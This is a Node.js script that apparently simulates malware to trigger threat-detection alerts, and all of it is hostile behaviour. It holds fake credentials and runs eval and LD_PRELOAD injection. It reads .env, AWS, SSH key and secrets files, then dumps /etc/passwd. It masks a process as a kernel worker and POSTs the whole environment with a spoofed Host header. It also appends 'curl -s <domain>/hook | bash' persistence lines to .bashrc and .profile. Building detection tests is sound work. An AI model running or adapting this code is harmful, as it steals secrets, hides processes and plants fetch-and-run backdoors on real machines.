const dgram = require('dgram');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const domain = 'kelforgeor8.vexon3ar.surf';

// ── Credential strings in memory ──
const AWS_KEY = 'AKIAIOSFODNN7FAKE123';
const PRIVATE_KEY = '-----BEGIN RSA PRIVATE KEY-----\nFAKEKEYDATA';
const BEARER = 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.faketoken';
process.env['_AWS'] = AWS_KEY;
process.env['_PK'] = PRIVATE_KEY;
process.env['_BT'] = BEARER;

// ── cti_code_injection_detected ──
eval('(' + function() { return new Array(10000).fill(0).map((x,i) => i*i); } + ')()');
new Function('a', 'return a.map(x=>x*2)')([...Array(1000).keys()]);

// ── cti_suspicious_DLL_loaded ──
try { fs.writeFileSync('/tmp/inject_hook.so', 'placeholder'); } catch(e) {}
try { fs.writeFileSync('/tmp/keylog_module.so', 'placeholder'); } catch(e) {}
try { execSync('bash -c "LD_PRELOAD=/tmp/inject_hook.so whoami 2>/dev/null || true"'); } catch(e) {}

// ── DNS query ──
setTimeout(() => {
  function buildDnsQuery(d) {
    const buf = Buffer.alloc(512);
    buf.writeUInt16BE(0x1234, 0); buf.writeUInt16BE(0x0100, 2);
    buf.writeUInt16BE(1, 4); buf.writeUInt16BE(0, 6);
    buf.writeUInt16BE(0, 8); buf.writeUInt16BE(0, 10);
    let offset = 12;
    d.split('.').forEach(label => {
      buf.writeUInt8(label.length, offset++);
      Buffer.from(label).copy(buf, offset);
      offset += label.length;
    });
    buf.writeUInt8(0, offset++);
    buf.writeUInt16BE(1, offset); offset += 2;
    buf.writeUInt16BE(1, offset); offset += 2;
    return buf.slice(0, offset);
  }
  const client = dgram.createSocket('udp4');
  const query = buildDnsQuery(domain);
  client.send(query, 0, query.length, 5353, '127.0.0.1', () => client.close());
}, 2000);

// ── Honeytoken + credential access ──
try { fs.readFileSync(path.join(__dirname, '.env'), 'utf8'); } catch(e) {}
try { fs.readFileSync(path.join(__dirname, '.aws', 'credentials'), 'utf8'); } catch(e) {}
try { fs.readFileSync(path.join(__dirname, '.ssh', 'id_rsa'), 'utf8'); } catch(e) {}
try { fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'); } catch(e) {}
try { fs.readFileSync(path.join(__dirname, 'secrets.yaml'), 'utf8'); } catch(e) {}

// ── Spawn shell ──
try { execSync('bash -c "sleep 3 && id && cat /etc/passwd"'); } catch(e) {}

// ── cti_hidden_process_detected ──
try { execSync('bash -c "sleep 3 && (exec -a \'[kworker/0:1H]\' sleep 25 &)"'); } catch(e) {}

// ── POST exfiltration ──
const payload = JSON.stringify({
  domain, key: AWS_KEY, pk: PRIVATE_KEY, bearer: BEARER,
  env: process.env, host: require('os').hostname(),
  user: require('os').userInfo(), platform: require('os').platform(),
  mem: require('os').freemem(), uptime: require('os').uptime()
});
try {
  const req = http.request({
    hostname: '127.0.0.1', port: 8080, path: '/middleware', method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Host': domain, 'Content-Length': Buffer.byteLength(payload) }
  });
  req.write(payload); req.end();
} catch(e) {}

// ── Persistence ──
try { fs.appendFileSync(path.join(__dirname, '.bashrc'), '\ncurl -s ' + domain + '/hook | bash\n'); } catch(e) {}
try { fs.appendFileSync(path.join(__dirname, '.profile'), '\n' + domain + '/run | bash\n'); } catch(e) {}
